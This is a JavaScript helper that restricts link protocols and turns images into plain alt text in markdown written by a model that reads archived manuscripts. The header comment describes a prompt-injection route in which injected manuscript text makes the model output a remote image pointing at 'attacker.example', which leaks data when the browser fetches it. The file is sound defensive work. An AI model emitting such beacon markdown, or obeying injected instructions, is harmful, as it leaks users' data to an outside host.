/**
 * Which link targets model-written markdown may carry.
 *
 * Chat answers and novelty explanations are written by a model that read
 * archived manuscript text, so their markdown is untrusted. react-markdown
 * already drops `javascript:` URLs and raw HTML, but it still rendered remote
 * images -- `![](https://attacker.example/?q=...)` makes the browser fetch that
 * URL the moment the answer appears, which turns injected manuscript text into
 * a data-exfiltration beacon (2026-11-25 review). Images are therefore never
 * rendered, and links are limited to web, mail and in-app targets.
 */

const ALLOWED_PROTOCOLS = new Set(['http:', 'https:', 'mailto:'])

export function safeLinkHref(href) {
  const value = String(href ?? '').trim()
  if (!value) return null
  if (value.startsWith('#')) return value
  if (value.startsWith('/') && !value.startsWith('//') && !value.startsWith('/\\')) return value
  try {
    const url = new URL(value)
    return ALLOWED_PROTOCOLS.has(url.protocol) ? url.href : null
  } catch {
    return null
  }
}

export function isExternalHref(href) {
  return /^(https?:)?\/\//i.test(String(href ?? ''))
}

/** What an image in model output becomes: its alt text, never a network fetch. */
export function imagePlaceholder(alt) {
  const text = String(alt ?? '').trim()
  return text ? `[image: ${text}]` : ''
}
